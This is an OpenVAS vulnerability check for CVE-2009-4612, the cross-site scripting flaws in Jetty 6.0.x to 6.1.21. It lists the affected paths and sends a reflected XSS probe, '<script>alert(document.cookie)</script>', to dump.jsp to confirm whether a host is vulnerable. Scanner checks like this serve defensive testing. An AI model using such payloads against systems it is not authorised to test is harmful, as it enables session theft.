###############################################################################
# OpenVAS Vulnerability Test
#
# Mort Bay Jetty Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:eclipse:jetty";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800285");
  script_version("2022-12-05T10:11:03+0000");
  script_tag(name:"last_modification", value:"2022-12-05 10:11:03 +0000 (Mon, 05 Dec 2022)");
  script_tag(name:"creation_date", value:"2010-02-02 07:26:26 +0100 (Tue, 02 Feb 2010)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2009-4612");

  script_name("Mort Bay Jetty Multiple Cross Site Scripting Vulnerabilities");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2009/Oct/319");
  script_xref(name:"URL", value:"http://www.ush.it/team/ush/hack_httpd_escape/adv.txt");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_jetty_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("jetty/detected");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site allowing Cross-Site Scripting
  attacks.");

  script_tag(name:"affected", value:"Jetty version 6.0.x to 6.1.21.");

  script_tag(name:"insight", value:"Multiple flaws exist due to error in 'PATH_INFO' parameter, it is not
  properly sanitised data before used via the default URI under 'jspsnoop/', 'jspsnoop/ERROR/',
  'jspsnoop/IOException/' and 'snoop.jsp'");

  script_tag(name:"summary", value:"Mort Bay Jetty is prone to multiple Cross Site Scripting vulnerabilities.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork:TRUE))
  exit(0);

url = "/test/jsp/dump.jsp?<script>alert(document.cookie)</script>";

if (http_vuln_check(port: port, url: url, pattern: "<script>alert\(document" + ".cookie\)</script>",
                    check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
